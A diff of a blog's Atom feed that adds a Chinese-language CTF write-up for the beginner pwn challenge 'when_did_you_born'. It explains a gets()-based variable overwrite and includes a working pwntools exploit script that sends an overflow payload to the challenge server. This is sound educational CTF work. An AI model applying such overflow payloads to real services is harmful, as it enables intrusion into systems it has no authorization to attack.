@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zhangzy999.github.io/</id>
     <title>小张的博客</title>
-    <updated>2020-05-21T01:12:41.734Z</updated>
+    <updated>2020-05-27T02:57:21.052Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zhangzy999.github.io/"/>
     <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
@@ -10,6 +10,40 @@
     <logo>https://zhangzy999.github.io/images/avatar.png</logo>
     <icon>https://zhangzy999.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, 小张的博客</rights>
+    <entry>
+        <title type="html"><![CDATA[解决的第一个pwn题目—攻防世界新手区：when_did_you_born]]></title>
+        <id>https://zhangzy999.github.io/post/pwn_adworld_birth/</id>
+        <link href="https://zhangzy999.github.io/post/pwn_adworld_birth/">
+        </link>
+        <updated>2020-05-27T01:50:48.000Z</updated>
+        <content type="html"><![CDATA[<p>开始pwn了，成为pwn手是我毕生的梦想（🙏<br>
+我们简单运行了一下程序，发现就是一个很简单的输入生日和名字的功能<br>
+我们拿到ida里面简单看一波伪代码<br>
+可以看到v5是不能输入1926，但是要想拿到flag还得是1926，二者冲突了<br>
+<img src="https://zhangzy999.github.io//post-images/1590544386227.png" alt="" loading="lazy"><br>
+然后发现前面还有一个v4，并且是危险函数gets，我们可以考虑通过v4覆盖v5的值，让v5的值变成1926从而绕过前面的if判断<br>
+<img src="https://zhangzy999.github.io//post-images/1590544537541.png" alt="" loading="lazy"><br>
+总结思路：首先随便输入一个v5，绕过第一个if判断，然后输入v4，通过v4溢出来覆盖v5，从而达到我们的目的，让程序本身去cat flag，我们也不用搞栈溢出啥的，只是一个单纯的“变量溢出”<br>
+直接写个exp打过去就行</p>
+<pre><code class="language-python">from pwn import *
+p = remote(&quot;124.126.19.106&quot;,&quot;47436&quot;)
+
+offset = 8  #偏移量是8
+
+p.recvuntil(&quot;Birth?&quot;) #这个是到第一个if判断停下来
+p.sendline(&quot;hhh&quot;) #我们随便打个东西进去就行
+
+p.recvuntil(&quot;Name?&quot;)
+birth = 0x786      #0x786 == 1926
+payload = &quot;A&quot;*offset + p64(birth)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>然后就拿到了flag<br>
+<img src="https://zhangzy999.github.io//post-images/1590546253003.PNG" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[GXYCTF2019]Ping Ping Ping—os命令总结]]></title>
         <id>https://zhangzy999.github.io/post/gxyctf2019ping-ping-ping/</id>
